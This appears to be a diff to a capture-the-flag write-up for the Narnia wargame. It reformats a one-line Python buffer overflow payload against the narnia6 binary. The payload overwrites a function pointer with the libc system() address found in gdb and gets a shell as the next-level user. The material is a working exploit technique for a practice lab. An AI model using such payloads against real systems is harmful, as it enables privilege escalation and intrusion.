@@ -9,7 +9,5 @@ bla
 (gdb) p system
 $1 = {int (const char *)} 0xf7c48170 <__libc_system>
 
-narnia6@gibson:/narnia$ ./narnia6 $(python3 -c "import sys, struct;
-sys.stdout.buffer.write(b'bash;'+b'a'*3+struct.pack('<I', 0xf7c481
-70))") 2
+narnia6@gibson:/narnia$ ./narnia6 $(python3 -c "import sys, struct;sys.stdout.buffer.write(b'bash;'+b'a'*3+struct.pack('<I', 0xf7c48170))") 2
 narnia7@gibson:/narnia$
